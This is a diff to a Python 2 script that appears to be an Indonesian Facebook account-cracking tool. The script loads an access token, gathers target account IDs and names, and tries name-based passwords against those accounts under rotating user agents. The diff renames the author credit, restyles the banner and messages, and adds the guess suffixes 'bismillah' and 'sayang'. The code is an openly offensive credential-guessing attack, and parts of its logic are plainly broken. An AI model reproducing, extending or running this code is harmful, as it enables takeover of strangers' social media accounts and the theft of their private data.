@@ -43,7 +43,7 @@ ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/
 #user agent
 rafi_ua = random.choice([ua_xx])
 #pw admin
-#pw_rafi = 'rafianonym'
+#pw_raka = 'rakaanonym'
 #ip
 try:
 	ip = requests.get('https://api.ipify.org').text
@@ -60,7 +60,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(00.1)
 
-rafi_logo = '''
+raka_logo = '''
 \x1b[1;96m _______  _______  _______  __    __  ______    _______ 
 \x1b[1;96m|  ___  ||       ||  ___  ||  \  |  ||  ___  ) |  ___  |
 \x1b[1;96m| (   ) || () () || (   ) ||   \ |  || |    ) || (   ) |
@@ -69,7 +69,9 @@ rafi_logo = '''
 \x1b[1;96m| (   ) || |   | || (   ) || | \    || |    | || (   ) |
 \x1b[1;96m| )   ( || )   ( || )   ( || )    ( || |___ ) || )   ( |
 \x1b[1;96m|/     \||/     \||/     \||/      \||______ ) |/     \|\n
-\x1b[1;101m\x1b[1;97mCreated By : Raka Andrian Tara 1 Januari 2022\x1b[0m
+\x1b[1;97mCreated By : \x1b[1;96mRaka Andrian Tara
+\x1b[1;97mGithub     : \x1b[1;96mBajingan-Z
+\x1b[1;97mCoded By   : \x1b[1;96mRaka \x1b[1;97m& \x1b[1;96mAngga\x1b[1;97m
 __________________________________________________
 '''
 
@@ -79,7 +81,7 @@ def login():
 		token = open('login_r.txt','r')
 		menu()
 	except (KeyError,IOError):
-		print(rafi_logo)
+		print(raka_logo)
 		print ' [1] login with token facebook '
 		print ' [0] exit \n'
 		met_log = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] Choose : ")
@@ -96,7 +98,7 @@ def login():
 
 def tokenz():
 	os.system('clear')
-	print(rafi_logo)
+	print(raka_logo)
 	try:
 		token = open('login_r.txt','r')
 	except (KeyError,IOError):
@@ -187,7 +189,7 @@ def menu():
 		
 def crack():
 	os.system('clear')
-	print(rafi_logo)
+	print(raka_logo)
 	global token
 	try:
 		token = open('login_r.txt', 'r').read()
@@ -208,15 +210,15 @@ def crack():
 		id.append(rax_x+'<=>'+name)
 	print(" [\x1b[101m\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
 	print(garis)
-	print ' \t\t\t\x1b[1;101m\x1b[1;97mCTRL+Z BERHENTI\x1b[0m'
-        print("\x1b[1;96mNote : Jika Tak Ada Hasil Mainkan Mode Pesawat 1 Detik ?")
+	print("\x1b[1;97mClick \x1b[1;96mCTRL+Z \x1b[1;97mUntuk Berhenti ...\x1b[1;97m")
+        print("\x1b[1;97mNote : \x1b[1;96mJika Tak Ada Hasil Mainkan Mode Pesawat 1 Detik \x1b[1;97m?")
 	print(garis)
 
 	def main(user):
 		global loop, token
 		ra_pw = []
 		sys.stdout.write(
-		      '\r [%sC] Cracking %s - %s Please Wait.. ! ' % (ra,loop, len(id))
+		      '\r [%sR] Crack %s - %s \x1b[1;96mMohon Ditunggu... \x1b[1;97m! ' % (ra,loop, len(id))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -225,12 +227,14 @@ def crack():
 			if len(ss)<3:
 				continue
 			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5 or len(ss) == 6 or len(ss) == 7:
 					ra_pw.append(name)
 					ra_pw.append(ss+"12")
 					ra_pw.append(ss+"123")
 					ra_pw.append(ss+"1234")
 					ra_pw.append(ss+"12345")
+                                        ra_pw.append(ss+"bismillah")
+                                        ra_pw.append(ss+"sayang")
 				else:
 					ra_pw.append("000786")
 					ra_pw.append("786786")
@@ -278,7 +282,7 @@ def crack():
 
 if __name__ == '__main__':
 	#os.system('clear')
-	#print(rafi_logo)
+	#print(raka_logo)
 	#user = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] siapa nama anda : ')
 	#print# ' hello : %s'#%(user)
 	#lock()
